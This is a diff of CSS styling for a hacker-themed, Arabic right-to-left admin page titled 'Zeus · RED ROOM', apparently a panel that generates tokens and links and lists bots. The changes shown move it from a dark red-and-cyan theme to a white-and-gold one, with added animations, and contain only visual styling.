@@ -6,17 +6,20 @@
     <title>𝒁𝒆𝒖𝒔 · RED ROOM</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* ===== BASE ===== */
+        /* ============================================================
+           𝕳𝕬𝕮𝕶𝕰𝕽 · 𝕽𝕰𝕯 · 𝕲𝕺𝕷𝕯 — 𝒁𝒆𝒖𝒔 𝕰𝕯𝕴𝕿𝕴𝕺𝕹
+           ============================================================ */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            background: #0a0a0a;
-            color: #e0e0e0;
+            background: #f5f3f0;
+            color: #1a1a1a;
             font-family: 'Cairo', 'Segoe UI', sans-serif;
             display: flex;
             justify-content: center;
@@ -25,53 +28,87 @@
             margin: 0;
             padding: 20px;
             direction: rtl;
-            background-image:
-                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 51, 0.06) 0%, transparent 60%),
-                radial-gradient(ellipse at 80% 50%, rgba(0, 229, 255, 0.04) 0%, transparent 60%);
+            background-image: radial-gradient(ellipse at 10% 20%, rgba(212, 175, 55, 0.04) 0%, transparent 60%),
+                radial-gradient(ellipse at 90% 80%, rgba(204, 0, 51, 0.04) 0%, transparent 60%);
         }
 
-        /* ===== ADMIN PANEL ===== */
+        /* ============================================================
+           ADMIN PANEL — فاخر أبيض
+           ============================================================ */
         .container {
-            background: #0d0d0d;
-            border-radius: 24px;
-            padding: 32px 28px;
+            background: #ffffff;
+            border-radius: 32px;
+            padding: 34px 30px;
             max-width: 580px;
             width: 100%;
-            border: 1px solid rgba(255, 0, 51, 0.15);
-            box-shadow: 0 0 60px rgba(255, 0, 51, 0.04), inset 0 0 60px rgba(255, 0, 51, 0.02);
+            border: 1px solid rgba(212, 175, 55, 0.15);
+            box-shadow: 0 20px 80px rgba(0, 0, 0, 0.06), 0 8px 32px rgba(0, 0, 0, 0.03), inset 0 1px 0 rgba(255, 255, 255, 0.8);
             position: relative;
             overflow: hidden;
+            animation: containerFloat 6s ease-in-out infinite;
+        }
+        @keyframes containerFloat {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-6px);
+            }
         }
         .container::before {
             content: '';
             position: absolute;
             inset: 0;
-            background: repeating-linear-gradient(0deg,
-                    transparent,
-                    transparent 2px,
-                    rgba(255, 0, 51, 0.01) 2px,
-                    rgba(255, 0, 51, 0.01) 4px);
+            background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(212, 175, 55, 0.012) 3px, rgba(212, 175, 55, 0.012) 4px);
             pointer-events: none;
+            border-radius: 32px;
         }
 
-        /* ===== GLITCH TITLE ===== */
+        /* ============================================================
+           HEADER — 𝒁𝒆𝒖𝒔 مع ERROR GLITCH
+           ============================================================ */
         .glitch-wrapper {
             text-align: center;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
             position: relative;
         }
+
         .glitch-title {
             font-family: 'Orbitron', sans-serif;
             font-weight: 900;
-            font-size: 62px;
-            letter-spacing: 8px;
-            color: #ff0033;
+            font-size: 68px;
+            letter-spacing: 10px;
+            color: #cc0033;
             display: inline-block;
             position: relative;
-            text-shadow: 0 0 30px rgba(255, 0, 51, 0.20), 0 0 60px rgba(255, 0, 51, 0.06);
-            animation: glitchText 4.8s infinite;
+            text-shadow: 0 0 40px rgba(204, 0, 51, 0.12), 0 0 80px rgba(204, 0, 51, 0.04);
+            animation: glitchTextPremium 3.2s infinite;
             line-height: 1.1;
         }
+        .glitch-title .error-text {
+            font-size: 14px;
+            letter-spacing: 6px;
+            display: block;
+            color: #cc0033;
+            opacity: 0.6;
+            font-weight: 700;
+            margin-top: -6px;
+            animation: errorPulse 1.8s ease-in-out infinite;
+            text-shadow: 0 0 30px rgba(204, 0, 51, 0.10);
+        }
+        @keyframes errorPulse {
+            0%,
+            100% {
+                opacity: 0.4;
+                letter-spacing: 6px;
+            }
+            50% {
+                opacity: 0.9;
+                letter-spacing: 10px;
+            }
+        }
+
         .glitch-title::before,
         .glitch-title::after {
             content: attr(data-text);
@@ -83,70 +120,108 @@
             pointer-events: none;
         }
         .glitch-title::before {
-            color: #00e5ff;
+            color: #d4af37;
             z-index: -1;
-            animation: glitchShift 4.2s infinite;
-            clip-path: polygon(0 0, 100% 0, 100% 42%, 0 42%);
-            transform: translate(-4px, -3px);
-            opacity: 0.5;
+            animation: glitchShiftGold 3.6s infinite;
+            clip-path: polygon(0 0, 100% 0, 100% 38%, 0 38%);
+            transform: translate(-5px, -4px);
+            opacity: 0.35;
         }
         .glitch-title::after {
-            color: #7b00ff;
+            color: #880022;
             z-index: -2;
-            animation: glitchShift 3.6s infinite reverse;
-            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
-            transform: translate(4px, 3px);
-            opacity: 0.4;
+            animation: glitchShiftRed 3.0s infinite reverse;
+            clip-path: polygon(0 50%, 100% 50%, 100% 100%, 0 100%);
+            transform: translate(5px, 4px);
+            opacity: 0.30;
         }
-        @keyframes glitchShift {
+        @keyframes glitchShiftGold {
             0% {
                 transform: translate(0);
             }
-            15% {
-                transform: translate(-5px, 4px);
+            14% {
+                transform: translate(-6px, 5px);
             }
-            30% {
-                transform: translate(5px, -4px);
+            28% {
+                transform: translate(6px, -5px);
             }
-            45% {
-                transform: translate(-3px, -5px);
+            42% {
+                transform: translate(-4px, -6px);
             }
-            60% {
-                transform: translate(4px, 5px);
+            57% {
+                transform: translate(5px, 6px);
             }
-            75% {
-                transform: translate(-4px, 2px);
+            71% {
+                transform: translate(-5px, 3px);
             }
-            90% {
-                transform: translate(3px, -3px);
+            85% {
+                transform: translate(4px, -4px);
             }
             100% {
                 transform: translate(0);
             }
         }
-        @keyframes glitchText {
+        @keyframes glitchShiftRed {
+            0% {
+                transform: translate(0);
+            }
+            14% {
+                transform: translate(5px, -4px);
+            }
+            28% {
+                transform: translate(-5px, 4px);
+            }
+            42% {
+                transform: translate(3px, 5px);
+            }
+            57% {
+                transform: translate(-4px, -5px);
+            }
+            71% {
+                transform: translate(4px, -2px);
+            }
+            85% {
+                transform: translate(-3px, 3px);
+            }
+            100% {
+                transform: translate(0);
+            }
+        }
+        @keyframes glitchTextPremium {
             0%,
-            80%,
+            78%,
             100% {
                 transform: skew(0);
             }
+            79% {
+                transform: skew(6deg);
+            }
+            80% {
+                transform: skew(-6deg);
+            }
             81% {
-                transform: skew(5deg);
+                transform: skew(4deg);
             }
             82% {
-                transform: skew(-5deg);
+                transform: skew(-4deg);
             }
             83% {
-                transform: skew(3deg);
+                transform: skew(2deg);
             }
             84% {
-                transform: skew(-3deg);
+                transform: skew(-2deg);
             }
             85% {
-                transform: skew(1deg);
+                transform: skew(0);
             }
             86% {
-                transform: skew(-1deg);
+                transform: skew(3deg);
+            }
+            87% {
+                transform: skew(-3deg);
+            }
+            88% {
+                transform: skew(0);
             }
         }
 
@@ -155,68 +230,109 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 14px;
-            margin-top: 2px;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 18px;
-            font-weight: 700;
-            letter-spacing: 4px;
-            color: #888;
-            padding: 4px 0 10px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            gap: 16px;
+            margin-top: 0px;
+            padding: 6px 0 12px 0;
+            border-bottom: 1px solid rgba(212, 175, 55, 0.10);
         }
         .sub-brand .handle {
-            color: #00e5ff;
-            text-shadow: 0 0 20px rgba(0, 229, 255, 0.15);
-            letter-spacing: 3px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: 5px;
+            color: #d4af37;
+            text-shadow: 0 0 30px rgba(212, 175, 55, 0.10);
+            animation: handleGlow 3.4s ease-in-out infinite;
+        }
+        @keyframes handleGlow {
+            0%,
+            100% {
+                text-shadow: 0 0 20px rgba(212, 175, 55, 0.05);
+            }
+            50% {
+                text-shadow: 0 0 40px rgba(212, 175, 55, 0.20), 0 0 80px rgba(212, 175, 55, 0.06);
+            }
         }
         .sub-brand .telegram-link {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            width: 34px;
-            height: 34px;
+            width: 38px;
+            height: 38px;
             border-radius: 50%;
-            border: 1.5px solid rgba(0, 229, 255, 0.25);
-            transition: 0.3s ease;
+            border: 1.5px solid rgba(212, 175, 55, 0.20);
+            transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             cursor: pointer;
             text-decoration: none;
-            background: rgba(0, 229, 255, 0.04);
+            background: rgba(212, 175, 55, 0.03);
+            animation: badgePulse 4.2s ease-in-out infinite;
+        }
+        .sub-brand .telegram-link:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+        @keyframes badgePulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.06);
+            }
         }
         .sub-brand .telegram-link:hover {
-            border-color: #00e5ff;
-            box-shadow: 0 0 30px rgba(0, 229, 255, 0.15);
-            transform: scale(1.08);
+            border-color: #d4af37;
+            box-shadow: 0 0 40px rgba(212, 175, 55, 0.15), 0 0 80px rgba(212, 175, 55, 0.04);
+            transform: scale(1.12) rotate(-4deg);
         }
         .sub-brand .telegram-link svg {
-            width: 20px;
-            height: 20px;
-            fill: #00e5ff;
+            width: 22px;
+            height: 22px;
+            fill: #d4af37;
             opacity: 0.7;
             transition: 0.3s;
         }
         .sub-brand .telegram-link:hover svg {
             opacity: 1;
+            filter: drop-shadow(0 0 20px rgba(212, 175, 55, 0.15));
         }
 
-        /* ===== FORM ===== */
+        /* ============================================================
+           FORM
+           ============================================================ */
         .field {
-            margin-bottom: 18px;
+            margin-bottom: 20px;
+            animation: fieldFade 0.8s ease forwards;
+        }
+        .field:nth-child(1) {
+            animation-delay: 0.1s;
+        }
+        .field:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        @keyframes fieldFade {
+            0% {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         .field label {
             display: flex;
             align-items: center;
             gap: 10px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #aaa;
-            margin-bottom: 5px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 6px;
             letter-spacing: 0.5px;
         }
         .field label svg {
             width: 20px;
             height: 20px;
-            stroke: #ff0033;
+            stroke: #cc0033;
             stroke-width: 1.8;
             fill: none;
             stroke-linecap: round;
@@ -226,298 +342,451 @@
         }
         .field input {
             width: 100%;
-            padding: 12px 16px;
-            border-radius: 10px;
-            border: 1.5px solid rgba(255, 255, 255, 0.08);
-            background: rgba(255, 255, 255, 0.03);
-            color: #e0e0e0;
-            font-size: 15px;
+            padding: 14px 18px;
+            border-radius: 14px;
+            border: 1.5px solid #e0ddd8;
+            background: #fafaf8;
+            color: #1a1a1a;
+            font-size: 16px;
             font-family: 'Cairo', sans-serif;
             box-sizing: border-box;
             direction: ltr;
             text-align: left;
-            transition: 0.25s ease;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             letter-spacing: 0.5px;
+            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.02);
         }
         .field input:focus {
             outline: none;
-            border-color: #ff0033;
-            box-shadow: 0 0 0 3px rgba(255, 0, 51, 0.08), 0 0 40px rgba(255, 0, 51, 0.04);
-            background: rgba(255, 0, 51, 0.03);
+            border-color: #d4af37;
+            box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.08), inset 0 2px 6px rgba(0, 0, 0, 0.02);
+            background: #ffffff;
         }
         .field input::placeholder {
-            color: rgba(255, 255, 255, 0.15);
+            color: #bbb8b2;
             font-family: 'Cairo', sans-serif;
             letter-spacing: 0.5px;
         }
 
-        /* ===== FEATURES ===== */
+        /* ============================================================
+           FEATURES — ذهبية
+           ============================================================ */
         .features-label {
-            font-size: 14px;
-            font-weight: 600;
-            color: #aaa;
-            margin-bottom: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
             letter-spacing: 0.5px;
+            animation: fieldFade 0.8s ease 0.3s forwards;
+            opacity: 0;
         }
         .features-label svg {
-            width: 20px;
-            height: 20px;
-            stroke: #ff0033;
+            width: 22px;
+            height: 22px;
+            stroke: #d4af37;
             stroke-width: 1.8;
             fill: none;
-            opacity: 0.6;
         }
         .features-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 22px;
+            gap: 12px;
+            margin-bottom: 24px;
+            animation: fieldFade 0.8s ease 0.4s forwards;
+            opacity: 0;
         }
         .feature-item {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1.5px solid rgba(255, 255, 255, 0.06);
-            border-radius: 12px;
-            padding: 10px 4px;
+            background: #f8f7f5;
+            border: 1.5px solid #e8e5e0;
+            border-radius: 16px;
+            padding: 12px 6px;
             text-align: center;
             cursor: pointer;
-            transition: 0.25s ease;
-            font-size: 13px;
-            font-weight: 500;
-            color: #777;
+            transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            font-size: 14px;
+            font-weight: 600;
+            color: #888;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 5px;
+            gap: 6px;
             user-select: none;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
+            animation: featureFloat 5.2s ease-in-out infinite;
+        }
+        .feature-item:nth-child(1) {
+            animation-delay: 0s;
+        }
+        .feature-item:nth-child(2) {
+            animation-delay: 0.4s;
+        }
+        .feature-item:nth-child(3) {
+            animation-delay: 0.8s;
+        }
+        .feature-item:nth-child(4) {
+            animation-delay: 0.2s;
+        }
+        .feature-item:nth-child(5) {
+            animation-delay: 0.6s;
+        }
+        .feature-item:nth-child(6) {
+            animation-delay: 1.0s;
+        }
+        @keyframes featureFloat {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-4px);
+            }
         }
         .feature-item svg {
-            width: 26px;
-            height: 26px;
-            stroke: #555;
+            width: 28px;
+            height: 28px;
+            stroke: #999;
             stroke-width: 1.6;
             fill: none;
-            transition: 0.25s ease;
+            transition: all 0.35s ease;
         }
         .feature-item.active {
-            border-color: #ff0033;
-            background: rgba(255, 0, 51, 0.06);
-            color: #ff0033;
-            box-shadow: 0 0 30px rgba(255, 0, 51, 0.04);
+            border-color: #d4af37;
+            background: #fffcf5;
+            color: #cc0033;
+            box-shadow: 0 4px 20px rgba(212, 175, 55, 0.10), 0 0 40px rgba(212, 175, 55, 0.03);
+            transform: scale(1.02);
         }
         .feature-item.active svg {
-            stroke: #ff0033;
-            filter: drop-shadow(0 0 12px rgba(255, 0, 51, 0.15));
+            stroke: #d4af37;
+            filter: drop-shadow(0 0 20px rgba(212, 175, 55, 0.10));
+        }
+        .feature-item:hover {
+            border-color: rgba(212, 175, 55, 0.30);
+            transform: translateY(-2px);
         }
         .feature-item input {
             display: none;
         }
-        .feature-item:hover {
-            border-color: rgba(255, 0, 51, 0.25);
-        }
 
-        /* ===== BUTTON ===== */
+        /* ============================================================
+           BUTTON — 3D متحرك
+           ============================================================ */
         .btn-primary {
             width: 100%;
-            padding: 16px;
+            padding: 18px;
             border: none;
-            border-radius: 14px;
-            background: linear-gradient(145deg, #cc0033, #990026);
+            border-radius: 18px;
+            background: linear-gradient(145deg, #cc0033, #a00028);
             color: #fff;
-            font-size: 18px;
-            font-weight: 700;
-            letter-spacing: 2px;
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: 3px;
             font-family: 'Cairo', sans-serif;
             cursor: pointer;
-            transition: 0.15s ease;
-            box-shadow: 0 6px 0 #66001a, 0 8px 30px rgba(204, 0, 51, 0.25);
+            transition: all 0.15s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            box-shadow: 0 8px 0 #6e001a, 0 10px 40px rgba(204, 0, 51, 0.25);
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
+            gap: 14px;
+            position: relative;
+            overflow: hidden;
+            animation: btnGlow 4.6s ease-in-out infinite;
+            transform: translateY(0);
+        }
+        @keyframes btnGlow {
+            0%,
+            100% {
+                box-shadow: 0 8px 0 #6e001a, 0 10px 40px rgba(204, 0, 51, 0.20);
+            }
+            50% {
+                box-shadow: 0 8px 0 #6e001a, 0 10px 60px rgba(204, 0, 51, 0.35), 0 0 80px rgba(204, 0, 51, 0.06);
+            }
+        }
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 18px;
+            background: linear-gradient(120deg, transparent 30%, rgba(255, 255, 255, 0.10) 50%, transparent 70%);
+            transform: translateX(-120%);
+            transition: transform 0.7s ease;
+            pointer-events: none;
+        }
+        .btn-primary:hover::before {
+            transform: translateX(120%);
+        }
+        .btn-primary::after {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 20px;
+            padding: 2px;
+            background: linear-gradient(135deg, transparent, rgba(212, 175, 55, 0.20), transparent);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+        .btn-primary:hover::after {
+            opacity: 1;
         }
         .btn-primary svg {
-            width: 22px;
-            height: 22px;
+            width: 24px;
+            height: 24px;
             stroke: #fff;
             stroke-width: 2;
             fill: none;
             stroke-linecap: round;
             stroke-linejoin: round;
+            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.08));
         }
         .btn-primary:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 0 #66001a, 0 14px 40px rgba(204, 0, 51, 0.30);
-            background: linear-gradient(145deg, #dd0033, #aa0028);
+            transform: translateY(-3px) scale(1.01);
+            box-shadow: 0 10px 0 #6e001a, 0 18px 50px rgba(204, 0, 51, 0.30);
+            background: linear-gradient(145deg, #dd0033, #b00028);
         }
         .btn-primary:active:not(:disabled) {
-            transform: translateY(4px);
-            box-shadow: 0 2px 0 #66001a;
+            transform: translateY(5px);
+            box-shadow: 0 3px 0 #6e001a;
+            transition-duration: 0.06s;
         }
         .btn-primary:disabled {
             opacity: 0.5;
-            transform: translateY(3px);
-            box-shadow: 0 3px 0 #66001a;
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #6e001a;
             cursor: not-allowed;
+            animation: none;
         }
 
         .error {
-            color: #ff3366;
-            font-size: 13px;
-            margin-top: 6px;
-            min-height: 22px;
-            font-weight: 500;
+            color: #cc0033;
+            font-size: 14px;
+            margin-top: 8px;
+            min-height: 24px;
+            font-weight: 600;
             letter-spacing: 0.5px;
+            animation: errorShake 0.4s ease;
+        }
+        @keyframes errorShake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-6px);
+            }
+            75% {
+                transform: translateX(6px);
+            }
         }
 
-        /* ===== RESULT ===== */
+        /* ============================================================
+           RESULT
+           ============================================================ */
         .result-box {
-            margin-top: 20px;
-            padding: 18px;
-            border: 1.5px solid rgba(255, 0, 51, 0.20);
-            border-radius: 14px;
-            background: rgba(255, 0, 51, 0.04);
+            margin-top: 22px;
+            padding: 20px;
+            border: 1.5px solid rgba(212, 175, 55, 0.15);
+            border-radius: 18px;
+            background: #fcfbf9;
             display: none;
             text-align: center;
+            animation: resultPop 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+            box-shadow: 0 4px 30px rgba(212, 175, 55, 0.04);
+        }
+        @keyframes resultPop {
+            0% {
+                opacity: 0;
+                transform: scale(0.94) translateY(10px);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+        .result-box .label {
+            font-weight: 700;
+            color: #cc0033;
+            margin-bottom: 4px;
+            letter-spacing: 1.5px;
+            font-size: 15px;
         }
         .result-box .short-token {
             font-family: 'Orbitron', monospace;
-            font-size: 30px;
-            font-weight: 700;
-            color: #ff0033;
-            letter-spacing: 6px;
+            font-size: 34px;
+            font-weight: 900;
+            color: #cc0033;
+            letter-spacing: 8px;
             margin: 6px 0;
-            text-shadow: 0 0 30px rgba(255, 0, 51, 0.15);
+            text-shadow: 0 0 40px rgba(204, 0, 51, 0.08);
+            animation: tokenPulse 3.2s ease-in-out infinite;
+        }
+        @keyframes tokenPulse {
+            0%,
+            100% {
+                text-shadow: 0 0 20px rgba(204, 0, 51, 0.04);
+            }
+            50% {
+                text-shadow: 0 0 50px rgba(204, 0, 51, 0.12), 0 0 80px rgba(204, 0, 51, 0.04);
+            }
         }
         .result-box .link-url {
-            color: #aaa;
-            font-size: 14px;
+            color: #666;
+            font-size: 15px;
             word-break: break-all;
-            background: rgba(255, 255, 255, 0.03);
-            padding: 8px 12px;
-            border-radius: 8px;
-            margin: 8px 0;
+            background: #f5f3f0;
+            padding: 10px 14px;
+            border-radius: 12px;
+            margin: 10px 0;
             font-family: 'Cairo', sans-serif;
             direction: ltr;
             text-align: left;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            border: 1px solid #e8e5e0;
         }
         .result-box .actions {
             display: flex;
-            gap: 12px;
+            gap: 14px;
             justify-content: center;
-            margin-top: 12px;
+            margin-top: 14px;
         }
         .result-box .actions button {
-            background: rgba(255, 255, 255, 0.04);
-            border: 1.5px solid rgba(255, 0, 51, 0.20);
-            color: #ccc;
-            padding: 8px 22px;
-            border-radius: 8px;
+            background: #f8f7f5;
+            border: 1.5px solid #e0ddd8;
+            color: #333;
+            padding: 10px 26px;
+            border-radius: 12px;
             cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
+            font-size: 15px;
+            font-weight: 700;
             font-family: 'Cairo', sans-serif;
-            transition: 0.2s ease;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
+            box-shadow: 0 4px 0 #d5d2cc, 0 4px 12px rgba(0, 0, 0, 0.02);
+            transform: translateY(0);
         }
         .result-box .actions button svg {
-            width: 18px;
-            height: 18px;
-            stroke: #ccc;
+            width: 20px;
+            height: 20px;
+            stroke: #555;
             stroke-width: 2;
             fill: none;
-            transition: 0.2s ease;
+            transition: 0.3s ease;
         }
         .result-box .actions button:hover {
-            background: rgba(255, 0, 51, 0.08);
-            border-color: #ff0033;
-            color: #fff;
-            box-shadow: 0 0 30px rgba(255, 0, 51, 0.06);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 0 #d5d2cc, 0 8px 24px rgba(0, 0, 0, 0.04);
+            border-color: #d4af37;
+            background: #fffcf5;
         }
         .result-box .actions button:hover svg {
-            stroke: #fff;
+            stroke: #d4af37;
+        }
+        .result-box .actions button:active {
+            transform: translateY(3px);
+            box-shadow: 0 2px 0 #d5d2cc;
+            transition-duration: 0.06s;
         }
 
-        /* ===== LOG ===== */
+        /* ============================================================
+           LOG — مع أرقام متحركة
+           ============================================================ */
         .log-wrapper {
             position: relative;
-            margin-top: 18px;
-            border-radius: 12px;
+            margin-top: 20px;
+            border-radius: 16px;
             overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            background: #080808;
-            min-height: 120px;
+            border: 1px solid #e8e5e0;
+            background: #fafaf8;
+            min-height: 130px;
+            box-shadow: inset 0 2px 12px rgba(0, 0, 0, 0.02);
         }
         .log-wrapper canvas {
             position: absolute;
             inset: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.25;
+            opacity: 0.15;
             pointer-events: none;
         }
         .log {
             position: relative;
             z-index: 1;
-            padding: 14px 16px;
+            padding: 14px 18px;
             font-family: 'Courier New', 'Cairo', monospace;
-            font-size: 13px;
-            color: #aaa;
-            min-height: 120px;
+            font-size: 14px;
+            color: #555;
+            min-height: 130px;
             direction: ltr;
             text-align: left;
             max-height: 180px;
             overflow-y: auto;
             background: transparent;
-            text-shadow: 0 0 12px rgba(0, 229, 255, 0.04);
         }
         .log::-webkit-scrollbar {
-            width: 3px;
+            width: 4px;
         }
         .log::-webkit-scrollbar-track {
             background: transparent;
         }
         .log::-webkit-scrollbar-thumb {
-            background: #ff003344;
-            border-radius: 2px;
+            background: #d4af37;
+            border-radius: 4px;
         }
         .log .prompt {
-            color: #ff0033;
+            color: #cc0033;
             font-weight: 700;
-            text-shadow: 0 0 20px rgba(255, 0, 51, 0.15);
+            text-shadow: 0 0 20px rgba(204, 0, 51, 0.06);
+        }
+        .log .gold {
+            color: #d4af37;
         }
         .log .success {
-            color: #00e5ff;
+            color: #2d8a4e;
         }
         .log .wait {
-            color: #ffaa00;
+            color: #cc8833;
         }
         .log .error-log {
-            color: #ff3366;
+            color: #cc0033;
         }
         .log .dim {
-            color: #555;
+            color: #bbb8b2;
         }
         .log .line {
-            padding: 2px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+            padding: 3px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.02);
+            animation: lineIn 0.3s ease;
         }
         .log .line:last-child {
             border-bottom: none;
         }
+        @keyframes lineIn {
+            0% {
+                opacity: 0;
+                transform: translateX(-8px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
         .cursor {
             display: inline-block;
-            width: 8px;
-            height: 16px;
-            background: #ff0033;
+            width: 9px;
+            height: 18px;
+            background: #cc0033;
             vertical-align: -2px;
             animation: blink 1s steps(1) infinite;
-            box-shadow: 0 0 12px rgba(255, 0, 51, 0.2);
+            box-shadow: 0 0 20px rgba(204, 0, 51, 0.10);
+            margin-left: 2px;
         }
         @keyframes blink {
             50% {
@@ -525,26 +794,28 @@
             }
         }
 
-        /* ===== BOT LIST ===== */
+        /* ============================================================
+           BOT LIST
+           ============================================================ */
         .bot-list-wrap {
-            margin-top: 16px;
-            border-top: 1px solid rgba(255, 255, 255, 0.04);
-            padding-top: 14px;
+            margin-top: 18px;
+            border-top: 1px solid #e8e5e0;
+            padding-top: 16px;
         }
         .bot-list-wrap .list-header {
             display: flex;
             align-items: center;
-            gap: 10px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #777;
-            margin-bottom: 6px;
+            gap: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #555;
+            margin-bottom: 8px;
             letter-spacing: 0.5px;
         }
         .bot-list-wrap .list-header svg {
-            width: 20px;
-            height: 20px;
-            stroke: #555;
+            width: 22px;
+            height: 22px;
+            stroke: #d4af37;
             stroke-width: 1.8;
             fill: none;
         }
@@ -552,71 +823,69 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 6px 4px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-            font-size: 14px;
+            padding: 8px 4px;
+            border-bottom: 1px solid #f0eee9;
+            font-size: 15px;
             direction: ltr;
             font-family: 'Cairo', sans-serif;
+            animation: lineIn 0.3s ease;
         }
         .bot-item .btoken {
-            color: #ff0033;
+            color: #cc0033;
             font-weight: 700;
             font-family: 'Orbitron', monospace;
-            letter-spacing: 1.5px;
-            font-size: 13px;
+            letter-spacing: 2px;
+            font-size: 14px;
         }
         .bot-item .binfo {
-            color: #555;
-            font-size: 12px;
+            color: #bbb8b2;
+            font-size: 13px;
             font-weight: 400;
         }
         .bot-item .del {
-            color: #ff0033;
-            opacity: 0.35;
+            color: #cc0033;
+            opacity: 0.30;
             cursor: pointer;
-            font-size: 18px;
+            font-size: 20px;
             line-height: 1;
-            transition: 0.2s ease;
+            transition: 0.3s ease;
         }
         .bot-item .del:hover {
             opacity: 1;
+            transform: scale(1.2);
         }
 
-        /* ===== FOOTER ===== */
+        /* ============================================================
+           FOOTER — فاخر أسود مع برق
+           ============================================================ */
         .footer-wrap {
-            margin-top: 22px;
-            padding: 0 4px;
+            margin-top: 24px;
+            padding: 0 2px;
         }
         .footer-box {
-            background: #080808;
-            border-radius: 14px;
-            padding: 14px 18px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: #0d0d0d;
+            border-radius: 18px;
+            padding: 18px 20px;
+            border: 1px solid rgba(212, 175, 55, 0.08);
             position: relative;
             overflow: hidden;
             text-align: center;
-            box-shadow: inset 0 0 60px rgba(0, 0, 0, 0.4);
+            box-shadow: inset 0 0 80px rgba(0, 0, 0, 0.3);
             width: 100%;
         }
         .footer-box::before {
             content: '';
             position: absolute;
             inset: -1px;
-            border-radius: 14px;
+            border-radius: 18px;
             padding: 1.5px;
-            background: linear-gradient(90deg,
-                    transparent,
-                    #ff0033,
-                    #00e5ff,
-                    #ff0033,
-                    #00e5ff,
-                    transparent);
+            background: linear-gradient(90deg, transparent, #d4af37, #cc0033, #d4af37, #cc0033, transparent);
             background-size: 300% 100%;
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
             mask-composite: exclude;
             pointer-events: none;
-            animation: lightningMove 3.8s linear infinite;
+            animation: lightningMove 3.4s linear infinite;
         }
         @keyframes lightningMove {
             0% {
@@ -629,20 +898,17 @@
         .footer-box .footer-text {
             font-family: 'Orbitron', 'Cairo', sans-serif;
             font-weight: 700;
-            font-size: 18px;
-            letter-spacing: 3px;
-            color: #aaa;
+            font-size: 20px;
+            letter-spacing: 4px;
+            color: #d4af37;
             position: relative;
             display: inline-block;
-            text-shadow: 0 0 20px rgba(255, 0, 51, 0.04);
-            padding: 2px 10px;
+            text-shadow: 0 0 40px rgba(212, 175, 55, 0.04);
+            padding: 2px 12px;
